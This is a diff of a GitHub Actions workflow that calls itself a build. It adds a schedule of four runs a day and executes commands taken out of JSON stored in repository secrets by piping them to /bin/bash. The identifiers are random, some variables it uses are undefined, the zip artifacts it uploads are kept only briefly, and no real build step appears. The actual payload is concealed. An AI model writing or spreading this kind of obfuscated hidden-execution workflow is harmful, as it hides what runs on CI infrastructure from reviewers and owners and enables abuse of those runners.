@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,16 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          nga2128: ${{ secrets.nga2128 }}
+          lem3: ${{ secrets.lem3 }}
         run: |
-          printf '%s' "$nga2128" | jq -r .c6522 | /bin/bash
-          printf '%s' "$fs134" | jq -r .kmytj473 | /bin/bash
-          printf '%s' "$is51" | jq -r .rqhs10485 | /bin/bash
-          printf '%s' "$cpia38751" | jq -r .jz98942 | /bin/bash
+          printf '%s' "$lem3" | jq -r .i89 | /bin/bash
+          echo $wl9 | jq -r .x2015 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: zcJViMfJ
+          name: LaTXm7IY
           path: "*.zip"
           retention-days: 1
